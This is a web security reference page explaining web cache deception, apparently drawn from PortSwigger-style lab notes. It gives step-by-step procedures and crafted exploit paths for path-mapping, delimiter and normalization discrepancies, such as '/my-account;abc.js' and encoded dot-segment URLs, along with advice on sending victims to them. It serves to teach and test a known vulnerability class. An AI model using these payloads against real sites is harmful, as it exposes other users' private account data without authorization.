---
title: "Web cache deception"
weight: 25
---

<details><summary>Introduction</summary>

Web cache deception is a vulnerability where an attacker tricks a web cache into storing sensitive content due to differences in how cache and origin servers handle requests. The attacker lures a victim into visiting a malicious URL, causing the cache to mistakenly store private data as a static resource. The attacker can then access the cached response, gaining unauthorized access to the sensitive information.

</details>

More info about web cache: [Web cache](/web/web-security/web-cache/)

---

## Constructing a web cache deception attack

1. Identify a target endpoint that returns dynamic responses with sensitive information, focusing on those supporting `GET`, `HEAD`, or `OPTIONS` methods, as they are typically cached
2. Look for discrepancies in how the cache and origin server parse the URL path
3. Craft a malicious URL to trick the cache into storing a dynamic response. When the victim accesses it, their data is cached. Use Burp to request the same URL and retrieve the cached response. Avoid using a browser to prevent redirects or data invalidation.

---

## Static extension cache rules

Cache rules often target static resources by matching common file extensions like `.css` or `.js`. This is the default behavior in most CDNs.

### Path mapping discrepancies

<details><summary>Path mapping discrepancies (REST-style vs traditional URL)</summary>

Consider the following example:

`http://example.com/user/123/profile/wcd.css`

* An origin server using **REST-style** URL mapping may interpret this as a request for the `/user/123/profile` endpoint and returns the profile information for user `123`, ignoring `wcd.css` as a non-significant parameter.
* A cache that uses **traditional URL** mapping may view this as a request for a file named `wcd.css` located in the `/profile` directory under `/user/123`. It interprets the URL path as `/user/123/profile/wcd.css`. If the cache is configured to store responses for requests where the path ends in `.css`, it would cache and serve the profile information as if it were a CSS file.

</details>

```python
# 1. Find good endpoint
/my-account        # Contains sensitive data -> Good endpoint

# 2. Check if web cache is used
/test.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
/test.js # 2 time "X-Cache: hit" -> Perfect, the page is cached

# 3. Check if origin server uses REST-style
/my-account/abc    # The response is identical to the original -> REST-style

# 4. Check if cache server uses traditional URL & explotation
/my-account/abc.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
/my-account/abc.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
# Now https://site.com/my-account/abc.js contains your sensitive data cached

# Find a way to send the victim on http://site.com/my-account/xyz.js
# Note: I omitted cache buster for simplicity
```

> **Note**:
> * This attack is limited to the specific endpoint that you tested, as the origin server often has different abstraction rules for different endpoints.
> * Try various extensions, such as `.css`, `.ico`, and `.exe`, as caches may have rules for specific extensions.


### Delimiter discrepancies

Objective: identify a character that is used as a delimiter by the origin server but not the cache. Use this list: [https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)

```python
# 1. Find good endpoint
/my-account        # Contains sensitive data -> Good endpoint

# 2. Check if web cache is used
/test.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
/test.js # 2 time "X-Cache: hit" -> Perfect, the page is cached

# 3. Fuzz delimeter char
/my-account§§aaa   # Fuzz delimeter char. -> with ";" -> The response matches the original

# 4. Check if delimiter is not used by the cache
/my-account         # "X-Cache: miss"
/my-account;abc.js  # "X-Cache: miss"
# So the cache thinks "/my-account" is different from "/my-account;abc.js"

# 5. Exploitation
/my-account;abc.js # 1 time "X-Cache: miss"
/my-account;abc.js # 2 time "X-Cache: hit"
# Now https://site.com/my-account;abc.js contains your sensitive data cached

# Find a way to send the victim on http://site.com/my-account;xyz.js
# Note: I omitted cache buster for for simplicity
```

> **Note**: 
> * Because delimiters are generally used consistently within each server, you can often use this attack on many different endpoints.
> *   Some delimiter characters may be processed by the victim's browser before it forwards the request to the cache. This means that some delimiters can't be used in an exploit. For example, browsers URL-encode characters like `{`, `}`, `<`, and `>`, and use `#` to truncate the path.
> 
>    If the cache or origin server decodes these characters, it may be possible to use an encoded version in an exploit.
> * Make sure to test all ASCII characters and a range of common extensions, including `.css`, `.ico`, and `.exe`

---

## Static directory cache rules (with normalization discrepancies)

Web servers often store static resources in specific directories. Cache rules typically target these by matching URL path prefixes like `/static`, `/assets`, `/scripts`, or `/images`.

Premise

* If you type in your browser `https://website/test/../account`, it'll make the following request `GET /account HTTP/2`. &#x20;
* If you type in your browser`https://website/test/..%2faccount`, it'll make the following request `GET /test/..%2faccount HTTP/2`. &#x20;

```python
# 1. Find good endpoint
/my-account            # Contains sensitive data -> Good endpoint

# 2. Check if web cache is used (with static resources)
/static/js/info.js     # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
/static/js/info.js     # 2 time "X-Cache: hit" -> Perfect, the page is cached
```

### Normalization by the origin server

```python
# 3. Confirm that the cache rule is based on the static directory
/static/../xxx         # 1 time "X-Cache: miss"
/static/../xxx         # 2 time "X-Cache: hit" -> so all subpages in /static/ will be cached 

# 4. Detecting normalization by the origin server
/aaa/..%2fmy-account   # Returns the profile information -> The origin server decodes the slash and resolves the dot-segment

# 5. Detecting normalization by the cache server
/static/js/info.js     # 1 time "X-Cache: miss"
/static/js%2finfo.js   # 2 time "X-Cache: miss" -> Cache isn't normalizing the path before mapping it to the endpoint
# So the cache thinks "/static/js/info.js" is different from "/static/js%2finfo.js"

# 6. Exploiting
/static/..%2fmy-account

# The cache interprets the path as: /static/..%2fmy-account
# The origin server interprets the path as: /my-account
```

### Normalization by the cache server

```python
# 3. Confirm that the cache rule is based on the static directory
# This step is useless, so you can't confirm if the cache decodes 
# dot-segments and URL paths without trying an exploit.

# 4. Detecting normalization by the origin server
/aaa/..%2fmy-account   # Not found -> The origin server doesn't decode the slash and doesn't resolve the dot-segment

# 5. Detecting normalization by the cache server
/static/js/info.js     # 1 time "X-Cache: miss"
/static/js/info.js     # 2 time "X-Cache: hit"
/static/js%2finfo.js   # 2 time "X-Cache: hit" -> Cache has normalized the path
# So the cache understand that they are the same path

# 6. Identify a delimiter that is used by the origin server but not the cache
/my-account§§aaa   # Fuzz delimeter char. -> with "%23" -> The response matches the original

# 7. Check if delimiter is not used by the cache 
/static/js/info.js        # "X-Cache: miss"
/static/js/info.js%23aaa  # "X-Cache: miss"
# So the cache thinks "info.js" is different from "info.js%23aaa"

# 8. Exploitation
/my-account%23%2f%2e%2e%2fstatic/js/info.js

# The cache interprets the path as: /static
# The origin server interprets the path as: /my-account
```
